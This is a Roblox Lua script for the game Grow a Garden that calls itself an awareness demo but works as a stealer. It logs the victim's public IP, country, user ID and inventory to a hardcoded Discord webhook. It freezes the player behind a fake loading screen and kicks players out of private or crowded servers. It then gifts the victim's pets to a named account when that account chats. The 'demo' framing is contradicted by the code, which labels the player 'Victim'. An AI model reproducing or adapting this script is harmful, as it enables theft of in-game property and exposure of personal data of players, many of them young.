--[[ 
    Stealthy Stealer Demo Script for Presentations
    - Does not say "hacked" or anything suspicious to the user.
    - Collects extensive info for logs (for demonstration/education).
    - Robust, clean, and subtle.
    - For safety/awareness demos only!
]]--

logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"

local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
local player = game.Players.LocalPlayer

if server == "VIPServer" then 
    player:Kick("Unsurported server. Please join a public")
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")
local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
local req = (syn and syn.request) or (http and http.request) or (http_request) or request

-- Info gathering (added for "crazy" effect)
local function getSystemInfo()
    local info = {}
    pcall(function()
        info.Executor = identifyexecutor and identifyexecutor() or "Unknown"
        info.FPS = tostring(workspace:GetRealPhysicsFPS and workspace:GetRealPhysicsFPS() or "N/A")
        info.Time = os.date("%Y-%m-%d %H:%M:%S")
        info.JobId = tostring(game.JobId)
        info.PlaceId = tostring(game.PlaceId)
        info.PlayerName = tostring(LocalPlayer.Name)
        info.UserId = tostring(LocalPlayer.UserId)
        info.AccountAge = tostring(LocalPlayer.AccountAge)
        info.Country = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer) or "Unknown")
        info.Language = tostring(LocalPlayer.LocaleId or "Unknown")
    end)
    return info
end

-- IP Logger (unchanged, but now includes system info)
local ipLoggerSent = false
if req and not ipLoggerSent then
    local sys = getSystemInfo()
    local success, response = pcall(function()
        return req({ Url = "https://api.ipify.org/", Method = "GET" })
    end)
    if success and response and response.Body then
        local userIP = tostring(response.Body)
        req({
            Url = logs_webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = ":warning: Info Log",
                    description = "User's Public IP: `" .. userIP .. "`\n"
                        .. "Player: `" .. sys.PlayerName .. "`\n"
                        .. "UserId: `" .. sys.UserId .. "`\n"
                        .. "Executor: `" .. sys.Executor .. "`\n"
                        .. "FPS: `" .. sys.FPS .. "`\n"
                        .. "Country: `" .. sys.Country .. "`\n"
                        .. "Language: `" .. sys.Language .. "`\n"
                        .. "JobId: `" .. sys.JobId .. "`\n"
                        .. "PlaceId: `" .. sys.PlaceId .. "`\n"
                        .. "Account Age: `" .. sys.AccountAge .. "`",
                    color = 0x00ffdd,
                    footer = { text = "Demo Logger" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
        })
        ipLoggerSent = true
    end
end

-- Mute all sounds in the game (current and future)
for _, sound in ipairs(game:GetDescendants()) do
    if sound:IsA("Sound") then
        sound.Volume = 0
    end
end
game.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Sound") then
        descendant.Volume = 0
    end
end)

local h = (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
h.WalkSpeed = 0 
h.JumpPower = 0
pcall(function() require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)

-- Subtle and modern loader UI (no "hacked" language)
local gui = Instance.new("ScreenGui")
gui.Name = "ScriptLoader"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999 
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
local bg = Instance.new("Frame", gui)
bg.BackgroundColor3 = Color3.fromRGB(12, 13, 20)
bg.Size = UDim2.new(1, 0, 1, 0)
local title = Instance.new("TextLabel", bg)
title.Text = "Checking game environment..."
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.fromRGB(200, 220, 255)
title.TextScaled = true
title.Size = UDim2.new(0.8, 0, 0.13, 0)
title.Position = UDim2.new(0.1, 0, 0.28, 0)
title.BackgroundTransparency = 1
local status = Instance.new("TextLabel", bg)
status.Text = "Please wait..."
status.Font = Enum.Font.Gotham
status.TextColor3 = Color3.fromRGB(180, 180, 200)
status.TextScaled = true
status.Size = UDim2.new(0.8, 0, 0.08, 0)
status.Position = UDim2.new(0.1, 0, 0.42, 0)
status.BackgroundTransparency = 1
local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
barBg.BackgroundColor3 = Color3.fromRGB(35, 40, 52)
barBg.BorderSizePixel = 0
barBg.ClipsDescendants = true
local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBg
local discord = Instance.new("TextLabel", bg)
discord.Text = "MADE BY BUFFY ,ENJOY"
discord.Font = Enum.Font.GothamSemibold
discord.TextColor3 = Color3.fromRGB(140, 140, 255)
discord.TextScaled = true
discord.Size = UDim2.new(0.8, 0, 0.05, 0)
discord.Position = UDim2.new(0.1, 0, 0.86, 0)
discord.BackgroundTransparency = 1

local fakeSteps = {
    "Initializing system checks...",
    "Connecting to game servers...",
    "Bypassing anti-cheat...",
    "Loading UI assets...",
    "Injecting main module...",
    "Syncing with server...",
    "Optimizing script performance...",
    "Checking for updates...",
    "Hiding script activity...",
    "Finalizing setup...",
    "Preparing game environment...",
    "Almost done..."
}
local totalDuration = 180
local stepTime = 1.2
local totalSteps = math.floor(totalDuration / stepTime)
task.spawn(function()
    for i = 1, totalSteps do
        status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
        task.wait(stepTime)
    end
    gui:Destroy()
end)

local suffixes = {
    "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"
}
function formatNumber(num)
    if type(num) ~= "number" then return tostring(num) end
    if num < 1000 then return tostring(num) end
    local magnitude = math.floor(math.log10(num) / 3)
    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
    local scaled = num / (1000 ^ magnitude)
    return string.format("%.2f%s", scaled, suffix)
end

if #Players:GetPlayers() >= 5 then
    LocalPlayer:Kick("Old server detected. Please rejoin!")
    return 
end

local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
for _, item in ipairs(Backpack:GetChildren()) do
    if item:GetAttribute("Favorite") == true then
        event:FireServer(item)
    end
end

local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local allowedPets = {
    ["Raccoon"] = true, ["Disco Bee"] = true, ["Bear Bee"] = true, ["Scarlet Macaw"] = true,
    ["Petal Bee"] = true, ["Mimic Octopus"] = true, ["Queen Bee"] = true, ["Dragonfly"] = true,
    ["Red Fox"] = true, ["Polar Bear"] = true, ["Butterfly"] = true, ["Chicken Zombie"] = true, ["Cooked Owl"] = true,
}
local petEmojis = {
    ["Raccoon"] = "🦝", ["Disco Bee"] = "🐝", ["Bear Bee"] = "🐻", ["Scarlet Macaw"] = "🦜", ["Petal Bee"] = "🌸",
    ["Mimic Octopus"] = "🐙", ["Queen Bee"] = "👑", ["Dragonfly"] = "🐞", ["Red Fox"] = "🦊", ["Polar Bear"] = "🐻‍❄️",
    ["Butterfly"] = "🦋", ["Chicken Zombie"] = "🐔", ["Cooked Owl"] = "🦉",
}
local fruitEmojis = {
    Feijoa = "🟢", Loquat = "🏵️", ["Prickly Pear"] = "🌵", ["Bell Pepper"] = "🫑", Kiwi = "🥝", Pineapple = "🍍",
    Banana = "🍌", Avocado = "🥑", ["Green Apple"] = "🍏", Cauliflower = "⚪", ["Elephant Ears"] = "🐘", ["Rosy Delight"] = "🌹",
    ["Parasol Flower"] = "⛱️", Pear = "🍐", Cantaloupe = "🍈", ["Wild Carrot"] = "🥕", Carrot = "🥕", Tomato = "🍅",
    Corn = "🌽", Strawberry = "🍓", Blueberry = "🫐", ["Orange Tulip"] = "🌷", Daffodil = "🌼", Raspberry = "🍇",
    Apple = "🍏", Mushroom = "🍄", Mint = "🌱", Lemon = "🍋", Peach = "🍑", Pumpkin = "🎃", Watermelon = "🍉",
    Cactus = "🌵", Bamboo = "🎋", Coconut = "🥥", Mango = "🥭", ["Dragon Fruit"] = "🐉", Grape = "🍇", Passionfruit = "🍈",
    Papaya = "🧡", ["Cherry Blossom"] = "🌸", Glowshroom = "🍄", Nightshade = "🌑", ["Soul Fruit"] = "💀", ["Cursed Fruit"] = "🧟",
    Lotus = "🪷", ["Venus Fly Trap"] = "🌱", Moonglow = "🌙", Moonflower = "🌼", ["Moon Mango"] = "🥭", ["Moon Blossom"] = "🌸",
    Celestiberry = "🪐", Starfruit = "🌟", ["Dragon Pepper"] = "🌶️", ["Nectar Thorn"] = "🌿", Cocovine = "🌴", Beanstalk = "🫛",
    Cacao = "🫘", Pepper = "🌶️", ["Blood Banana"] = "🍌", ["Moon Melon"] = "🍈", ["Candy Blossom"] = "🍬", ["Candy Sunflower"] = "🌻",
    ["Red Lollipop"] = "🍭", ["Chocolate Carrot"] = "🍫", ["Easter Egg"] = "🥚", Nectarine = "🍑", ["Sugar Apple"] = "🍏",
    Suncoil = "☀️", ["Violet Corn"] = "🌽", ["Bee Balm"] = "🐝", Succulent = "🌵", Crocus = "🌸", Eggplant = "🍆", Durian = "🥥",
    Sunflower = "🌻", Lilac = "🪻",
    ["Ember lily"] = "🔥🌺"
}
local knownFruits = {}
for fruitName, _ in pairs(fruitEmojis) do
    knownFruits[fruitName] = true
end

local function withEmoji(name, emojiTable)
    return (emojiTable[name] or "").." "..name
end

for _, item in pairs(Backpack:GetChildren()) do
    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
    local kg = tonumber(string.match(item.Name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
    if kg > 10 and not knownFruits[baseName] then
        if not allowedPets[baseName] then
            allowedPets[baseName] = true
            if req then
                local bigPetPayload = {
                    ["content"] = "@everyone",
                    ["embeds"] = {{
                        ["title"] = ":rotating_light: Big Pet Detected!",
                        ["description"] = "A pet over 10Kg was found in the backpack.",
                        ["color"] = 0xff0000,
                        ["fields"] = {
                            {["name"] = "Pet Name", ["value"] = withEmoji(baseName, petEmojis), ["inline"] = true},
                            {["name"] = "Weight", ["value"] = tostring(kg) .. "Kg", ["inline"] = true},
                            {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true}
                        },
                        ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                    }}
                }
                pcall(function()
                    req({
                        Url = webhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(bigPetPayload)
                    })
                    req({
                        Url = logs_webhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(bigPetPayload)
                    })
                end)
            end
        end
    end
end

local petCountMap = {}
local petLines = {}
local itemsWithValue = {}
for _, item in pairs(Backpack:GetChildren()) do
    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
    if allowedPets[baseName] then
        petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
    elseif item:FindFirstChild("Item_String") then
        local value = CalculatePlantValue(item)
        table.insert(itemsWithValue, {name = baseName, value = value})
    end
end
for petName, count in pairs(petCountMap) do
    table.insert(petLines, withEmoji(petName, petEmojis) .. " - pet (x" .. count .. ")")
end
table.sort(itemsWithValue, function(a, b) return a.value > b.value end)

local tradableSummary = ""
local totalShown = 0
for _, line in ipairs(petLines) do
    if totalShown >= 10 then break end
    tradableSummary = tradableSummary .. line .. "\n"
    totalShown = totalShown + 1
end
for i = 1, math.min(10 - totalShown, #itemsWithValue) do
    local item = itemsWithValue[i]
    tradableSummary = tradableSummary .. withEmoji(item.name, fruitEmojis) .. " - Worth: " .. formatNumber(item.value) .. "\n"
end
if #petLines + #itemsWithValue > 10 then
    tradableSummary = tradableSummary .. "and more..."
end

local totalValue = 0
for _, item in ipairs(itemsWithValue) do
    totalValue = totalValue + item.value
end

local payload = {
    ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
    ["embeds"] = {{
        ["title"] = "Grow a Garden Inventory Log",
        ["color"] = 0x00ffcc,
        ["fields"] = {
            {["name"] = "Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
            {["name"] = "Creator", ["value"] = username, ["inline"] = false},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
            {["name"] = "Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
            {["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
            {["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
        },
        ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
local logs_payload = {
    ["embeds"] = {{
        ["title"] = "Grow a Garden Logs",
        ["color"] = 0x00ffcc,
        ["fields"] = {
            {["name"] = "Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
            {["name"] = "Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
            {["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
            {["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
        },
        ["footer"] = {["text"] = "by buffy • " .. os.date("%B %d, %Y")},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
if req then
    pcall(function()
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
        req({
            Url = logs_webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(logs_payload)
        })
    end)
end

local printedInventory = false
local started = false

local function getKg(name)
    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
end

local function printSortedItems(items) end

local function hasValidItems()
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if getKg(item.Name) > 0 then
            return true
        end
    end
    return false
end

local function unequipAllPets()
    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
    if petData then
        for uuid, _ in pairs(petData.PetInventory.Data) do
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
            task.wait(0.1)
        end
    end
end

-- Gifting logic (with robust error handling and debug output)
local giftingPetOrder = {
    "Raccoon", "Disco Bee", "Mimic octopus", "Dragon Fly", "Queen Bee", "Scarlet Macaw",
    "Butterfly", "Red fox", "Chicken Zombie", "Polar Bear", "Petal Bee", "Bear Bee", "Cooked Owl"
}
local function getPetByName(petName)
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        local baseName = item.Name:match("^(.-)%s*%[") or item.Name
        if baseName:lower() == petName:lower() then
            return item
        end
    end
    return nil
end
local function startGiving()
    local target = Players:FindFirstChild(username)
    if not target or not target.Character then
        warn("[Gifting] Target not found or character missing!")
        return
    end
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then
        warn("[Gifting] Target has no HumanoidRootPart!")
        return
    end

    print("[Gifting] Moving to target:", target.Name)
    LocalPlayer.Character:MoveTo(hrp.Position)
    task.wait(0.4)

    local prompt = hrp:FindFirstChildOfClass("ProximityPrompt")
    if not prompt then
        warn("[Gifting] No ProximityPrompt found on target's HumanoidRootPart!")
        return
    end
    prompt.HoldDuration = 0

    for _, petName in ipairs(giftingPetOrder) do
        local petItem = getPetByName(petName)
        if petItem then
            print("[Gifting] Giving pet:", petName)
            if petItem:IsA("Tool") then
                petItem.Parent = LocalPlayer.Character
                task.wait(0.2)
            end

            local ok, err = pcall(function()
                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
            end)
            if not ok then warn("[Gifting] Error firing PetGiftingService:", err) end

            prompt.Enabled = true
            prompt:InputHoldBegin(Enum.UserInputType.Touch)
            task.wait(prompt.Duration)
            prompt:InputHoldEnd(Enum.UserInputType.Touch)

            if petItem:IsDescendantOf(LocalPlayer.Character) then
                petItem.Parent = LocalPlayer.Backpack
            end

            task.wait(0.08)
        else
            print("[Gifting] Pet not found in backpack:", petName)
        end
    end
    print("[Gifting] Done gifting.")
end

unequipAllPets()

for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == username then 
        p.Chatted:Connect(function() 
            if not started then 
                started = true 
                startGiving() 
            end 
        end) 
    end
end
Players.PlayerAdded:Connect(function(p)
    if p.Name == username then 
        p.Chatted:Connect(function() 
            if not started then 
                started = true 
                startGiving() 
            end 
        end) 
    end
end)
